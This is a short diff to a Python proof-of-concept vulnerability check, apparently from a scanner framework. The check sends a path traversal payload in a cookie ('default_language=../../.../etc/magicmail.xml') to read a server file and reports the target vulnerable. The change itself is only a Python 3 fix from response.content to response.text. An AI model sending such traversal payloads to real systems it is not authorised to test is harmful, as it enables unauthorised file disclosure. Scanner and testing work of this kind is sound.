@@ -51,7 +51,7 @@ class Poc(ABPoc):
                 'Cookie': 'PHPSESSID=3ace2e3a43f61cec66534415d785f65;default_language=../../.../etc/magicmail.xml'
             }
             response = requests.get(vul_url, headers=headers)
-            if response.status_code == 200 and 'Warning' in response.content:
+            if response.status_code == 200 and 'Warning' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
